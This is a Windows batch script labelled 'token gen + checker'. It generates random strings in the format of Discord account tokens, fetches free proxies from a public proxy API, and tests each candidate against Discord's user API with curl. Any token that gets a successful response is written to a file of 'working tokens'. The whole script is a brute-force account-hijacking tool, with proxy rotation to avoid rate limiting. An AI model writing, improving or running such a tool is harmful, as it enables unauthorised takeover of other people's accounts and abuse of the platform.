:gennn
color b
title token gen + checker
cls
@echo off
setlocal enabledelayedexpansion

set "discord_api_url=https://discordapp.com/api/v6/users/@me/library"
set "ascii_letters=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
set "alphanum=%ascii_letters%0123456789_-"
set "proxy_url=https://www.proxyscan.io/api/proxy?format=txt&type=http"

echo Select a prefix for all generated tokens
echo [0] MD    [1] MT    [2] Mj    [3] Mz    [4] ND
echo [5] NT    [6] Nj    [7] Nz    [8] OD    [9] OT
choice /C:0123456789 /N >nul
set /a sample_string_prefix=%errorlevel%-1

set /p "token_count=How many tokens: "
set /a token_count=token_count
for /L %%A in (1,1,%token_count%) do (
	call :generate_base64_string
	for /f %%B in ('curl -ks "%proxy_url%"') do set "proxy=%%B"
	<nul set /p "=!base64_string!    "
	
	for /f "delims=" %%B in (
		'curl -ks -x "!proxy!" "%discord_api_url%" -H "Content-Type:application/json" -H "authorization:!base64_string!" -w "%%{http_code}"'
	) do (
		echo %%B | find "200" >nul
		if "!errorlevel!"=="0" (
			echo [32mPASS[0m
			>>workingtokens.txt echo !base64_string!
		) else (
			echo [31mFAIL[0m
		)
	)
)
timeout 10 >NUL
goto gennn
:generate_base64_string
set "sample_string_file=%~dp0\raw_token_value.txt"
set "base64_output_file=%~dp0\base64_output.txt"
set "sample_string=%sample_string_prefix%"
for /L %%B in (1,1,17) do (
	set /a rnd=!RANDOM!%%10
	set "sample_string=!sample_string!!rnd!"
)
echo !sample_string! >"%sample_string_file%"
certutil -f -encode "%sample_string_file%" "%base64_output_file%" >nul 2>&1

find "==" "%base64_output_file%" >nul && goto :generate_base64_string
(
	set /p ".="
	set /p "base64_string="
) <"%base64_output_file%"
del "%sample_string_file%" "%base64_output_file%"

set "base64_string=!base64_string!."
set /a rnd_upper_index=(!RANDOM!%%26)+26
set "base64_string=!base64_string!!ascii_letters:~%rnd_upper_index%,1!"

call :append_alphanum base64_string 5
set "base64_string=!base64_string!."
call :append_alphanum base64_string 27
exit /b

:append_alphanum
for /L %%a in (1,1,%~2) do (
	set /a rnd=!RANDOM!%%62
	for /F %%b in ("!rnd!") do set "%~1=!%~1!!alphanum:~%%b,1!"
)
exit /b

